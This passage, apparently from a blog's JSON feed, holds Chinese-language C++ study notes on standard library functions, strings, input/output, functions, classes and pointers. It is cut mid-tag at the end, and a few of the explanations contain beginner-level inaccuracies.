keyword\">int</span>和<span class=\"token keyword\">char</span>指针的时候，发生了隐式类型转换，把<span class=\"token keyword\">void</span>指针转换成了相应类型的指针。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>C语言中，<span class=\"token keyword\">void</span> 类型的变量可以赋值给任意类型的指针，<span class=\"token keyword\">void</span>也可以被任意类型的指针赋值，两个方向都不会报错。</pre></td></tr></table></figure><pre><code class=\"language-c++\">C++是强类型语言，void*是不能隐式转换成其他类型的指针的\n#ifdef __cplusplus\n#define NULL 0                 NULL为0\n#else\n#define NULL ((void *)0)       用作空指针可能是为了兼容C，迫于无奈\n#endif\nC++具有更严格的类型检查，void 类型的变量不能赋值给任意类型的指针，但void可以被任意类型的指针赋值(void* 是万能指针)。    \n</code></pre>\n<p><strong>总结</strong></p>\n<p>c++ 中 NULL 为 0 ，nullptr 为空指针</p>\n<p>没有 c++11 如何解决？</p>\n<pre><code class=\"language-c++\">const class nullptr_t\n&#123;\npublic:\n    template&lt;class T&gt;\n    inline operator T*() const\n        &#123; return 0; &#125;\n \n    template&lt;class C, class T&gt;\n    inline operator T C::*() const\n        &#123; return 0; &#125;\n \nprivate:\nvoid operator&amp;() const;\n&#125; nullptr = &#123;&#125;;\n</code></pre>\n<h2 id=\"push_back\"><a class=\"anchor\" href=\"#push_back\">#</a> push_back( )</h2>\n<ul>\n<li>\n<p>push_back () 在 Vector 最后添加一个元素（参数为要插入的值），位置为当前最后一个元素的下一个元素</p>\n<pre><code class=\"language-c++\">//在vec尾部添加10\nvector&lt;int&gt; vec;\nvec.push_back(10);\n</code></pre>\n</li>\n<li>\n<p>在 string 的最后插入一个字符</p>\n<pre><code class=\"language-c++\">string str;\nstr.push_back('d');\n</code></pre>\n</li>\n</ul>\n<h2 id=\"reverse\"><a class=\"anchor\" href=\"#reverse\">#</a> reverse( )</h2>\n<p>实现翻转数组，字符串，向量</p>\n<p>std :: reverse 反转了 [first，<strong>last</strong>）范围内的元素</p>\n<p>注意 last 是开区间，所以尾部要比需要反转的最后一个元素地址<strong>大 1</strong>（数组）</p>\n<p>1、翻转数组</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\n//使用方法\nreverse(a, a+n);//n为数组中的元素个数\na为指针首地址，a+k为数组第k+1个元素的地址，a+n为数组第n+1的地址\n</code></pre>\n<p>2、翻转字符串</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\n//用法为\nreverse(str.begin(), str.end());\n</code></pre>\n<p>3、翻转向量</p>\n<pre><code class=\"language-c++\">//头文件\n#include &lt;algorithm&gt;\n//用法\nreverse(vec.begin(), vec.end());\n</code></pre>\n<h2 id=\"swap\"><a class=\"anchor\" href=\"#swap\">#</a> swap( )</h2>\n<pre><code class=\"language-c++\">该函数在 &lt;algorithm&gt; 头文件中声明。\n交换位置\nswap(a, b);\n</code></pre>\n<h2 id=\"uhash哈希函数t217\"><a class=\"anchor\" href=\"#uhash哈希函数t217\">#</a> uhash—— 哈希函数（T217）</h2>\n<p>uhash 以宏的方式定义了对哈希函数的操作函数</p>\n<pre><code class=\"language-c++\">#include &quot;uthash.h&quot;\nstruct hashTable &#123;\n    int id;                    /* key */\n    UT_hash_handle hh;         /* makes this structure hashable */\n&#125;;\nstruct hashTable *users = NULL;    /* important! initialize to NULL */\n</code></pre>\n<h2 id=\"abs\"><a class=\"anchor\" href=\"#abs\">#</a> abs( )</h2>\n<p>求绝对值函数</p>\n<p>头文件 #include&lt;cmath&gt;</p>\n<p>c++ 中 abs () 可以支持整数、浮点数和复数的求绝对值运算</p>\n<pre><code class=\"language-c++\">整型：\nint abs(int i)  //返回整型参数i的绝对值 \n\n复数（complex）：\ndouble cabs(struct complex znum)  //返回复数znum的绝对值  \n\n双精度浮点型：\ndouble fabs(double x)  //返回双精度参数x的绝对值  \n\n长整型：\nlong labs(long n)  //返回长整型参数n的绝对值 \n</code></pre>\n<h2 id=\"pow-函数\"><a class=\"anchor\" href=\"#pow-函数\">#</a> pow ( ) 函数</h2>\n<pre><code class=\"language-c++\">#include&lt;cmath&gt; //必要头文件\npow(x,y); //x的y次方\n一般来说的正确用法是pow(int,double)\n如：pow(2,2.0)\n</code></pre>\n<h2 id=\"增强for循环\"><a class=\"anchor\" href=\"#增强for循环\">#</a> 增强 for 循环</h2>\n<pre><code class=\"language-c++\">for(声明语句 : 表达式)\n&#123;\n   //代码句子\n   //声明语句：声明新的局部变量，与数组元素的类型匹配，用作输出或传值\n   //表达式：访问的数组名\n&#125;\n例：for (char ch: s)\n</code></pre>\n<h2 id=\"cctype函数\"><a class=\"anchor\" href=\"#cctype函数\">#</a> cctype 函数</h2>\n<p><strong>#include&lt;cctype&gt;// 头文件</strong></p>\n<p><strong>isalnum( )</strong></p>\n<pre><code class=\"language-c++\">判断一个字符是否是字母或者（十进制）数字，若为字母或者数字，则返回True(非0值)，否者返回False(0)\nisalnum (c)\n#include&lt;cctype&gt;//头文件\n</code></pre>\n<p><strong>isalpha( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个字母。如果是字母，返回true，否则返回false。返回true的范围正则可表示为：[a-z，A-Z]。\nisalpha (c);\n</code></pre>\n<p><strong>isblank( )</strong></p>\n<pre><code class=\"language-c++\">isblank()将空白字符视为制表符(“ \\ t”)和空格字符(“”)。\n检查字符c是否为空白字符。空白字符是用于分隔文本行内的单词的空格字符。如果是，则返回true；如果不是，则返回false。\n空格字符的ascii值是32.空格字符用正则表达式为：\\s\nisblank (c);\n</code></pre>\n<p><strong>isspace( )</strong></p>\n<pre><code class=\"language-c++\">isspace()考虑空格字符：('')-空格，('\\ t')-水平制表符，('\\ n')-换行符，('\\ v')-垂直制表符，('\\ f')-提要，( '\\ r')-回车\n如果是，则返回true；如果不是，则返回false。\nisspace(c);\n</code></pre>\n<p><strong>isdigit( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个十进制数字字符。如果是十进制数字字符，返回true，否则返回false。十进制数字字符用正则表达式为：[0-9]\nisdigit (c);\n</code></pre>\n<p><strong>islower( )</strong></p>\n<pre><code>判断参数“c”是否是一个小写字母。如果是小写字母，返回true，否则返回false。小写字母用正则表达式为：[a-z]\nislower (c);\n</code></pre>\n<p><strong>isupper( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个大写字母。如果是大写字母，返回true，否则返回false。大写字母用正则表达式为：[A-Z]\nisupper (c);\n</code></pre>\n<p><strong>isxdigit( )</strong></p>\n<pre><code class=\"language-c++\">判断参数“c”是否是一个十六进制数字字符。如果是十六进制数字字符，返回true，否则返回false。十六进制数字字符用正则表达式为：[a-f0-9A-F]。通常x在代码中有代表十六进制的含义，因此函数名为isxdigit。它比十进制数字字符多了小写a到f，大写A到F。因为十六进制表示时，是不区分大小写的，a和A表示的十六进制值都是十进制的10，所以十六进制数字字符有小写的abcdef,也包含大写的ABCDEF。\n\nisxdigit (c);\n</code></pre>\n<p><strong>tolower ()、toupper () 函数</strong></p>\n<pre><code class=\"language-c++\">将给定一个字符转换为小写\ntolower(ch);\n将给定一个字符转换为大写\ntoupper(ch);\n</code></pre>\n<h2 id=\"string类\"><a class=\"anchor\" href=\"#string类\">#</a> String 类</h2>\n<pre><code class=\"language-c++\">#include &lt;string&gt; //注意这里不是string.h，这是C字符串头文件\nusing namespace std;\n</code></pre>\n<p><strong>std::string 中的反向迭代器 rbegin（）、rend（）</strong></p>\n<pre><code class=\"language-c++\">rbegin()：表示string字符串的倒数第一个字符\nrend()：表示string字符串的正数第一个字符\nstring sgood_rev(sgood.rbegin(), sgood.rend());//定义一个新的翻转string类\n</code></pre>\n<p><strong>size</strong></p>\n<p>求 string 长度</p>\n<pre><code class=\"language-c++\">string.size(); 等价 string.length();\n</code></pre>\n<h2 id=\"stack栈用法\"><a class=\"anchor\" href=\"#stack栈用法\">#</a> stack 栈用法</h2>\n<pre><code class=\"language-c++\">#include&lt;stack&gt;//头文件\nstack&lt;int&gt; q;\t//以int型为例\nint x;\n//常用操作：\nq.push(x);\t\t//将x压入栈顶,括号内需要有变量\nq.top();\t\t//返回栈顶的元素\nq.pop();\t\t//删除栈顶的元素\nq.size();\t\t//返回栈中元素的个数\nq.empty();\t\t//检查栈是否为空,若为空返回true,否则返回false\n</code></pre>\n<h2 id=\"unordered_map-容器\"><a class=\"anchor\" href=\"#unordered_map-容器\">#</a> unordered_map 容器</h2>\n<p><em>无序的 map 容器</em></p>\n<pre><code class=\"language-c++\">#include &lt;unordered_map&gt;\nusing namespace std;\n</code></pre>\n<ul>\n<li>\n<p>以键值对（pair 类型）的形式存储数据，存储的各个键值对的键互不相同且不允许被修改</p>\n</li>\n<li>\n<p>使用 &lt;font color='red'&gt;[ ] 操作 &lt;/font &gt; 符来访问 key 值对应的 value 值，pairs [ch]</p>\n</li>\n</ul>\n<h2 id=\"exp-log\"><a class=\"anchor\" href=\"#exp-log\">#</a> exp( )、log( )</h2>\n<pre><code class=\"language-c++\">头文件：#include&lt;cmath&gt;\nexp(x):求e的x次方\nlog(x):求e为底，x的对数\n</code></pre>\n<h2 id=\"指定序列生成不同的排列\"><a class=\"anchor\" href=\"#指定序列生成不同的排列\">#</a> 指定序列生成不同的排列</h2>\n<pre><code class=\"language-c++\">头文件：#include&lt;algorithm&gt;\n    next_permutation按照字母顺序生成给定序列的下一个较大的序列，直到整个序列为减序位置\n    prev_premutation按照字母顺序生成给定序列的上一个较小的序列\n    二者原理相同，仅遍历顺序相反。\n</code></pre>\n",
            "tags": [
                "算法",
                "Algorithm"
            ]
        },
        {
            "id": "http://yoursite.com/Algorithm/c++%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/",
            "url": "http://yoursite.com/Algorithm/c++%E8%AF%AD%E6%B3%95%E5%9F%BA%E7%A1%80%E8%AF%BE/",
            "title": "c++语法基础",
            "date_published": "2024-03-16T15:29:08.000Z",
            "content_html": "<h1 id=\"简单顺序结构\"><a class=\"anchor\" href=\"#简单顺序结构\">#</a> 简单顺序结构</h1>\n<h2 id=\"main\"><a class=\"anchor\" href=\"#main\">#</a> main( )</h2>\n<p>最新版的 c++<strong> 不允许</strong>使用 void main ( )</p>\n<h2 id=\"printf格式\"><a class=\"anchor\" href=\"#printf格式\">#</a> printf 格式</h2>\n<pre><code class=\"language-c++\">%05d    宽度为5，左端自动补4个0\n%-5d    宽度为5，右端自动补空格\n%5.1f   保留小数点一位，宽度为5\n</code></pre>\n<h1 id=\"循环\"><a class=\"anchor\" href=\"#循环\">#</a> 循环</h1>\n<h2 id=\"增强for循环\"><a class=\"anchor\" href=\"#增强for循环\">#</a> 增强 for 循环</h2>\n<p>范围遍历</p>\n<pre><code class=\"language-c++\">string s = &quot;HELLO WORLD&quot;;\nfor(变量类型  新的遍历变量名 ： 被遍历的变量)\nfor(char c : s) cout &lt;&lt; c &lt;&lt; endl;\n//取地址改变字符串内容\nfor(char &amp;c : s) c = 'a';\n//auto类型\n//自动类型推导，但是必须初始化\nfor(auto c : s)//用于类型比较长的时候\n</code></pre>\n<h1 id=\"数组\"><a class=\"anchor\" href=\"#数组\">#</a> 数组</h1>\n<h2 id=\"分配内存\"><a class=\"anchor\" href=\"#分配内存\">#</a> 分配内存</h2>\n<p>指针数组初始化需要提前分配内存，并置 0，<strong>calloc</strong></p>\n<p>一般数组（已经设置数组边界值）已经分配好内存，只需置 0，<strong>memset</strong></p>\n<h2 id=\"获取数组长度\"><a class=\"anchor\" href=\"#获取数组长度\">#</a> 获取数组长度</h2>\n<ul>\n<li>\n<p>字符串数组长度：strlen ( )</p>\n</li>\n<li>\n<p>万能方法：</p>\n<p>sizeof (a) /sizeof (a [0]) —— 使用 sizeof 关键字</p>\n<p>注意：因为字符串结尾处还有一个‘ \\n ’字符，所以使用该方法时会比真实长度大了 1，即为 strlen ( ) + 1</p>\n</li>\n</ul>\n<h2 id=\"定义变量的默认值\"><a class=\"anchor\" href=\"#定义变量的默认值\">#</a> 定义变量的默认值</h2>\n<pre><code class=\"language-c++\">int n;//默认值为0\n</code></pre>\n<h1 id=\"字符串\"><a class=\"anchor\" href=\"#字符串\">#</a> 字符串</h1>\n<h2 id=\"用地址调用数组元素\"><a class=\"anchor\" href=\"#用地址调用数组元素\">#</a> 用地址调用数组元素</h2>\n<pre><code class=\"language-c++\">*(a+k);/*调用数组第k+1的元素*/\n</code></pre>\n<h2 id=\"ascii码值\"><a class=\"anchor\" href=\"#ascii码值\">#</a> ASCII 码值</h2>\n<p>每个常用字符都对应一个 - 128~127 的数字</p>\n<p>空格 &quot; &quot; 是 32</p>\n<p><code>’0’-‘9’是48-57</code></p>\n<p><code>’A’-‘Z’ 是65~90</code></p>\n<p><code>’a’-‘z’是97-122</code></p>\n<p>字符可以<strong>参与运算</strong>，需要用 **' 单引号 '<strong>，运算时会将其当做</strong>整数 **</p>\n<pre><code class=\"language-c++\">'1' != 1\n</code></pre>\n<h2 id=\"字符数组\"><a class=\"anchor\" href=\"#字符数组\">#</a> 字符数组</h2>\n<p>字符数组的长度至少要比字符串的长度<strong>多 1</strong> (必须要有一个空间存放 '\\0')</p>\n<p>字符串就是字符数组加上<strong>结束符’\\0’</strong></p>\n<p>Difference：</p>\n<pre><code class=\"language-c++\">/*单个字符用单引号'', 字符串用双引号&quot;&quot;*/\nchar a[] = &#123;'C', '+', '+'&#125;;//列表初始化，没有空字符\nchar a[] = &#123;'C', '+', '+', '\\0'&#125;;//列表初始化，含有空字符\nchar a[] = &quot;C++&quot;;//列表初始化，自动添加空字符'\\0'\n</code></pre>\n<h2 id=\"字符串输入\"><a class=\"anchor\" href=\"#字符串输入\">#</a> 字符串输入</h2>\n<h3 id=\"scanf\"><a class=\"anchor\" href=\"#scanf\">#</a> scanf</h3>\n<p><strong>过滤空格</strong></p>\n<p>% s 格式的输入不需要加上 &amp;，因为<strong>字符串的数组名</strong>就是指针，指向首地址（！仅限字符串数组！）</p>\n<p>遇到空格结束，不会过滤回车</p>\n<pre><code class=\"language-c++\">//从数组下标唯一1开始输入,输出类似\nscanf(&quot;%s&quot;, s + 1);\ncin &gt;&gt; s + 1;\n//字符串用空格或回车隔开即可\nscanf(&quot;%s%s&quot;, s1, s2);\n//过滤回车\nscanf(&quot;\\n%s&quot;,s);\n</code></pre>\n<h3 id=\"cin\"><a class=\"anchor\" href=\"#cin\">#</a> cin</h3>\n<p><strong>过滤空格</strong></p>\n<p>cin &gt;&gt; 字符串首地址，遇到空格或回车会停止，只能输入没有空格的字符串</p>\n<h3 id=\"cingetline\"><a class=\"anchor\" href=\"#cingetline\">#</a> cin.getline</h3>\n<p><strong>可读空格，可以读取一整行</strong></p>\n<pre><code class=\"language-c++\">两个头文件\n&lt;string&gt;\n&lt;iostream&gt;\n</code></pre>\n<p>cin.getline(s, 100);</p>\n<p>cin.getline (字符串首地址，最多读入长度)；</p>\n<p>遇到 ** 回车 '\\r'** 结束，可以有空格</p>\n<h3 id=\"fgets容易出错\"><a class=\"anchor\" href=\"#fgets容易出错\">#</a> fgets（容易出错）</h3>\n<p><strong>可读空格，可以读取一整行</strong></p>\n<pre><code class=\"language-c++\">char s[100];\n//fgets(s, 100, stdin)\n//fgets(字符串首地址，最多读入字符数，读入的文件名（一般为stdin）)\n</code></pre>\n<ul>\n<li>\n<p>该函数从 <code>stream</code>  所指的文件中读取以 <code>'\\n'</code>  结尾的一行（包括 <code>'\\n'</code>  在内）存到缓冲区 <code>s</code>  中，并且在该行末尾添加一个  <code>'\\0'</code>  组成完整的字符串。</p>\n</li>\n<li>\n<p><strong> <code>fgets()</code>  函数的最大读取大小是其 “ <code>第二个参数减1</code> ”，这是由于字符串是以 <code>’\\0’</code> 为结束符的</strong></p>\n</li>\n<li>\n<p><strong>输入回车时会读入 '\\n' ，输入 <code>n</code>  个字符按下回车输入， <code>fgets()</code>  存储进第一个参数指定内存地址的是 <code>n+2</code>  个字节</strong></p>\n</li>\n</ul>\n<h2 id=\"字符串输出\"><a class=\"anchor\" href=\"#字符串输出\">#</a> 字符串输出</h2>\n<h3 id=\"puts\"><a class=\"anchor\" href=\"#puts\">#</a> puts</h3>\n<p>puts (字符串数组名)；</p>\n<p><code>puts输出自带有换行</code></p>\n<h3 id=\"printf\"><a class=\"anchor\" href=\"#printf\">#</a> printf</h3>\n<p>printf(&quot;%s&quot;, s);</p>\n<h2 id=\"常用操作\"><a class=\"anchor\" href=\"#常用操作\">#</a> 常用操作</h2>\n<pre><code class=\"language-c++\">头文件：&lt;cstring&gt;\n</code></pre>\n<h3 id=\"strlen\"><a class=\"anchor\" href=\"#strlen\">#</a> strlen()</h3>\n<p>strlen (str)，求字符串的长度</p>\n<p><strong>一般提前用新变量保存好字符串的长度再进入循环</strong></p>\n<h3 id=\"strcmp\"><a class=\"anchor\" href=\"#strcmp\">#</a> strcmp()</h3>\n<p>strcmp (a, b)，比较两个字符串的大小，按照<strong>字典序</strong>方式比较</p>\n<p>字典序 (按照 ASCII 码)：abc &lt; adbe</p>\n<p><code>a &lt; b 返回-1</code></p>\n<p><code>a == b 返回0</code></p>\n<p><code>a &gt; b返回1</code></p>\n<h3 id=\"strcpy\"><a class=\"anchor\" href=\"#strcpy\">#</a> strcpy()</h3>\n<p>strcpy (a, b)，将字符串 b 复制给从 a 开始的字符数组</p>\n<h2 id=\"思想统计字符中字符出现的次数\"><a class=\"anchor\" href=\"#思想统计字符中字符出现的次数\">#</a> 思想：统计字符中字符出现的次数</h2>\n<p>开辟新的长度为 26 的数组，统计每个字幕出现的次数</p>\n<pre><code class=\"language-c++\">for(int i = 0; str[i]; i ++) //str[i]至'\\0'结束，循环也就停止  \n    cnt[str[i] - 'a'] ++;\n</code></pre>\n<h2 id=\"思想小写字母变为下一位\"><a class=\"anchor\" href=\"#思想小写字母变为下一位\">#</a> 思想：小写字母变为下一位</h2>\n<pre><code class=\"language-c++\">//c为增强for循环中设置的变量\nc = (c - 'a' + 1) % 26 + 'a';\n</code></pre>\n<h2 id=\"标准库类型string80用string处理常用\"><a class=\"anchor\" href=\"#标准库类型string80用string处理常用\">#</a> 标准库类型 String (80% 用 string 处理，常用)</h2>\n<h3 id=\"头文件\"><a class=\"anchor\" href=\"#头文件\">#</a> 头文件</h3>\n<pre><code class=\"language-c++\">//头文件\n#include&lt;string&gt;\n</code></pre>\n<h3 id=\"初始化定义\"><a class=\"anchor\" href=\"#初始化定义\">#</a> 初始化定义</h3>\n<pre><code class=\"language-c++\">string s1; //默认的空字符串\nstring s2 = s1;//s2等于s1\nstring s3 = &quot;jjj&quot;;\nstring s4(10, 'c');//s4为cccccccccc\n</code></pre>\n<h3 id=\"输入\"><a class=\"anchor\" href=\"#输入\">#</a> 输入</h3>\n<p><strong>scanf 不能用，会报错</strong></p>\n<h4 id=\"cin-2\"><a class=\"anchor\" href=\"#cin-2\">#</a> cin</h4>\n<p><strong>过滤空格</strong></p>\n<p>cin &gt;&gt; s;</p>\n<h4 id=\"getline\"><a class=\"anchor\" href=\"#getline\">#</a> getline</h4>\n<p><strong>可读空格，可以读取一整行</strong></p>\n<p>getline(cin, s);</p>\n<h3 id=\"输出\"><a class=\"anchor\" href=\"#输出\">#</a> 输出</h3>\n<h4 id=\"cout\"><a class=\"anchor\" href=\"#cout\">#</a> cout</h4>\n<p>cout &lt;&lt; s;</p>\n<h4 id=\"printf耗时更少\"><a class=\"anchor\" href=\"#printf耗时更少\">#</a> printf (耗时更少)</h4>\n<p><code>printf(&quot;%s\\n&quot;, s.c_str());</code></p>\n<p>c_str () 调用成员函数：返回字符数组的首地址</p>\n<h4 id=\"puts-2\"><a class=\"anchor\" href=\"#puts-2\">#</a> puts</h4>\n<p>puts(s1.c_str());</p>\n<p>c_str () 调用函数返回字符数组的首地址</p>\n<h3 id=\"empty\"><a class=\"anchor\" href=\"#empty\">#</a> empty</h3>\n<p>s.empty( )</p>\n<p>返回布尔值，s 为空返回 1，非空返回 0</p>\n<h3 id=\"size\"><a class=\"anchor\" href=\"#size\">#</a> size</h3>\n<p>s.size( )</p>\n<p>返回无符号整型的字符串长度</p>\n<p>与 strlen () 遍历一次求长的 o ( n) 时间复杂度不同，该函数时间复杂度为 o ( 1 )</p>\n<h3 id=\"string比较\"><a class=\"anchor\" href=\"#string比较\">#</a> string 比较</h3>\n<p>支持 &gt; &lt; &gt;= &lt;= == != 等所有比较操作，按字典序进行比较。</p>\n<h3 id=\"赋值\"><a class=\"anchor\" href=\"#赋值\">#</a> 赋值</h3>\n<pre><code class=\"language-c++\">s1 = s2;\n</code></pre>\n<p>给 s1 赋值为 s2 的值</p>\n<h3 id=\"相加\"><a class=\"anchor\" href=\"#相加\">#</a> 相加</h3>\n<p>必须确保每个加法运算符的两侧的运算对象<strong>至少有一个是 string</strong></p>\n<p>不能都为字符或字符串类型</p>\n<pre><code class=\"language-c++\">s3 = s1 + s2;\ns3 += s1;\n/*可以加上字符或字符串*/\ns3 = s3 + &quot;Hello&quot; + 'H';\n</code></pre>\n<h3 id=\"处理字符\"><a class=\"anchor\" href=\"#处理字符\">#</a> 处理字符</h3>\n<ul>\n<li>当成字符数组，例如可以 for 循环使用 s [i]</li>\n<li>使用增强 for 循环</li>\n</ul>\n<h1 id=\"函数\"><a class=\"anchor\" href=\"#函数\">#</a> 函数</h1>\n<h2 id=\"组成\"><a class=\"anchor\" href=\"#组成\">#</a> 组成</h2>\n<ul>\n<li>\n<p>返回类型 (必须写)、函数名字、由 0 个或多个形参组成的列表以及函数体</p>\n</li>\n<li>\n<p><strong>return 语句</strong>负责结束函数并返回一个值。不写会返回一个随机值。</p>\n</li>\n</ul>\n<h2 id=\"调用\"><a class=\"anchor\" href=\"#调用\">#</a> 调用</h2>\n<ul>\n<li>用实参初始化函数对应的形参</li>\n<li>将控制权转移给被调用函数。此时，主调函数的执行被暂时中断，被调函数开始执行。</li>\n</ul>\n<h2 id=\"声明和定义\"><a class=\"anchor\" href=\"#声明和定义\">#</a> 声明和定义</h2>\n<p>声明：没有函数体</p>\n<p>定义：必须写函数体</p>\n<h2 id=\"形参列表\"><a class=\"anchor\" href=\"#形参列表\">#</a> 形参列表</h2>\n<p>函数的形参列表可以为空，但是不能省略。</p>\n<pre><code class=\"language-c++\">void f1() &#123;/* …. */&#125;        // 隐式地定义空形参列表\nvoid f2(void) &#123;/* … */&#125;      // 显式地定义空形参列表\n</code></pre>\n<p>形参列表中的形参通常用逗号隔开，其中每个形参都是含有一个声明符的声明。即使两个形参的类型一样，也必须把两个类型都写出来：</p>\n<pre><code class=\"language-c++\">int f3(int v1, v2) &#123;/* … */&#125;       // 错误\nint f4(int v1, int v2) &#123;/* … */&#125;    // 正确\n</code></pre>\n<h2 id=\"返回类型\"><a class=\"anchor\" href=\"#返回类型\">#</a> 返回类型</h2>\n<ul>\n<li>大多数类型都可作为返回类型</li>\n<li>特殊：void—— 表示函数不返回任何值、</li>\n<li>函数的返回类型不能是数组类型或函数类型，但可以是<strong>指向数组或者函数的指针</strong>。</li>\n</ul>\n<h2 id=\"全局局部2静态变量\"><a class=\"anchor\" href=\"#全局局部2静态变量\">#</a> 全局 / 局部 / 2 静态变量</h2>\n<ul>\n<li>局部变量只可以在函数内部使用（重名时优先选择）</li>\n<li>全局变量可以在所有函数内使用</li>\n<li>static 静态，可以设置一个只在该函数内用的全局变量（节省空间，存入堆中，非栈）</li>\n</ul>\n<h2 id=\"参数传递\"><a class=\"anchor\" href=\"#参数传递\">#</a> 参数传递</h2>\n<h3 id=\"传值参数int-a\"><a class=\"anchor\" href=\"#传值参数int-a\">#</a> 传值参数（int a）</h3>\n<ul>\n<li>\n<p>初始化一个非引用类型的变量时，函数中设定的初始值被拷贝给主函数中的变量。</p>\n</li>\n<li>\n<p>在函数中对变量的改动不会影响主函数中的初始值。</p>\n</li>\n</ul>\n<h3 id=\"传引用参数int-a\"><a class=\"anchor\" href=\"#传引用参数int-a\">#</a> 传引用参数（int &amp;a）</h3>\n<ul>\n<li>当函数的形参为引用类型时，函数中对形参的修改会影响主函数中实参的值。</li>\n<li>使用引用的作用：避免拷贝、让函数返回额外信息。</li>\n</ul>\n<h3 id=\"重载\"><a class=\"anchor\" href=\"#重载\">#</a> 重载</h3>\n<p>函数名一样的情况无大碍，还取决于<strong>参数类型</strong></p>\n<h2 id=\"数组形参\"><a class=\"anchor\" href=\"#数组形参\">#</a> 数组形参</h2>\n<p><strong>传引用参数</strong></p>\n<ul>\n<li>\n<p>一维数组形参的写法：</p>\n<pre><code class=\"language-c++\">void print(int *a) &#123;/* … */&#125;\nvoid print(int a[]) &#123;/* … */&#125;\nvoid print(int a[10]) &#123;/* … */&#125;\n</code></pre>\n</li>\n<li>\n<p>多维数组形参的写法：</p>\n<p>多维数组中，除了<strong>第一维</strong>之外，其余维度的大小必须指定</p>\n<p>（c++ 中多维数组会被转化为一维数组的指针样式进行保存）</p>\n<pre><code class=\"language-c++\">void print(int (*a)[10]) &#123;/* … */&#125;\nvoid print(int a[][10]) &#123;/* … */&#125;\n</code></pre>\n</li>\n</ul>\n<h2 id=\"返回类型和return语句\"><a class=\"anchor\" href=\"#返回类型和return语句\">#</a> 返回类型和 return 语句</h2>\n<h3 id=\"两种形式\"><a class=\"anchor\" href=\"#两种形式\">#</a> 两种形式</h3>\n<pre><code class=\"language-c++\">return;\nreturn expression;\n</code></pre>\n<h3 id=\"返回类型和return语句-2\"><a class=\"anchor\" href=\"#返回类型和return语句-2\">#</a> 返回类型和 return 语句</h3>\n<p><strong>无返回值函数</strong></p>\n<ul>\n<li>没有返回值的 return 只能用在返回类型是 void 的函数中，该类函数也没必要写上 return</li>\n<li>有点类似于我们用 break 语句退出循环。</li>\n</ul>\n<p><strong>有返回值的函数</strong></p>\n<ul>\n<li>返回类型不是 void，每条 return 都必须返回一个与函数类型相同的值</li>\n</ul>\n<h2 id=\"函数递归\"><a class=\"anchor\" href=\"#函数递归\">#</a> 函数递归</h2>\n<p>函数内部可以调用函数本身</p>\n<h1 id=\"类结构体-指针引用\"><a class=\"anchor\" href=\"#类结构体-指针引用\">#</a> 类 &amp; 结构体 指针 &amp; 引用</h1>\n<h2 id=\"类\"><a class=\"anchor\" href=\"#类\">#</a> 类</h2>\n<p>类可以将变量、数组和函数完美地打包在一起</p>\n<p><strong>复杂抽象，比较庞大</strong></p>\n<ul>\n<li>\n<p>private</p>\n<p>后面的内容是私有成员变量，在类的外部不能访问</p>\n</li>\n<li>\n<p>public</p>\n<p>后面的内容是公有成员变量，在类的外部可以访问</p>\n</li>\n</ul>\n<pre><code class=\"language-c++\">class Person &#123;\n    int age;//类默认为private\n    private:\n    \tint age, height;\n    \tdouble monney;\n    \tstring books[N];\n    public:\n    \tint get_height()\n        &#123;\n            return height;\n        &#125;\n    public:\n    \tstring name;\n\t\tvoid say()\n        &#123;\n            cout &lt;&lt; &quot;I'm&quot; &lt;&lt; endl;\n        &#125;\n    \tint get_age()\n        &#123;\n            return age;\n        &#125;\n    \tvoid add_money(double x)\n        &#123;\n            money += x;\n        &#125;\n&#125;Person1, Person2;\nint main()\n&#123;\n    Person c;\n    c.name = &quot;hxh&quot;;\n    c.age = 18;//错误！因为age是private类型的变量\n    c.add_money(10000);\n&#125;\n</code></pre>\n<h2 id=\"结构体\"><a class=\"anchor\" href=\"#结构体\">#</a> 结构体</h2>\n<p><strong>比较短，存和数据相关的</strong></p>\n<pre><code class=\"language-c++\">struct Person &#123;\n\tint age;//结构体默认是public\n&#125;;\n</code></pre>\n<h2 id=\"内存空间分配方式\"><a class=\"anchor\" href=\"#内存空间分配方式\">#</a> 内存空间分配方式</h2>\n<p>程序的进程保存在堆栈中，保存形式为<strong>十六进制</strong></p>\n<ul>\n<li>\n<p>动态数据区：</p>\n<ul>\n<li>局部变量存在<strong>栈</strong>里，未设定初值，每次分配的位置不一样，所以每次都不一样</li>\n<li>向下增长，从上往下分配</li>\n</ul>\n</li>\n<li>\n<p>静态数据区：</p>\n<ul>\n<li>全局 / 静态变量存在<strong>堆</strong>里，设定初始值为 0</li>\n<li>向上增长，从下往上分配</li>\n</ul>\n</li>\n</ul>\n<p><code>1 byte = 8 bit</code></p>\n<h2 id=\"指针\"><a class=\"anchor\" href=\"#指针\">#</a> 指针</h2>\n<p>指针指向存放变量的值的地址。因此我们可以通过指针来修改变量的值。</p>\n<pre><code class=\"language-c++\">//找到变量地址，需要转化成指针类型\nchar c = 'a';\ncout &lt;&lt; (void*)&amp;c &lt;&lt; endl;\n\n//将变量值赋给指针\nint* p = &amp;a;//(int*)类型的p的值是变量a的地址\ncout &lt;&lt; *p &lt;&lt; endl;//读取指针p指向的变量的值\n*p = a;//修改p指向的变量的值\n</code></pre>\n<h2 id=\"区别注意点\"><a class=\"anchor\" href=\"#区别注意点\">#</a> 区别 &amp; 注意点</h2>\n<ul>\n<li>\n<p>不同点在于类默认是 private，结构体默认是 public。</p>\n</li>\n<li>\n<p><strong>指针访问 -&gt;</strong></p>\n</li>\n<li>\n<p>** 普通访问 **</p>\n</li>\n<li>\n<p>new</p>\n<pre><code class=\"language-c++\">struct Node &#123;\n    int val;\n    Node* next;\n    /*构造函数初始值列表*/\n   // 结点类型(输入值) : 变量1(传值), 变量2(传值) &#123;&#125;\n    Node(int _val) : val(_val), next(nullptr) &#123;&#125;\n&#125;;\nint main()\n&#123;\n    //定义Node类型的变量，p保存的是变量地址\n    Node* p = new Node(1);\n    auto q = new Node(2);//auto自动设置，因为new Node()自动返回Node*类型\n    auto o = new Node(3);\n    //定义Node类型的变量，结点值是1\n    Node node = Node(1);\n&#125;\n</code></pre>\n</li>\n</ul>\n<h2 id=\"数组特殊的指针\"><a class=\"anchor\" href=\"#数组特殊的指针\">#</a> 数组 —— 特殊的指针</h2>\n<pre><code 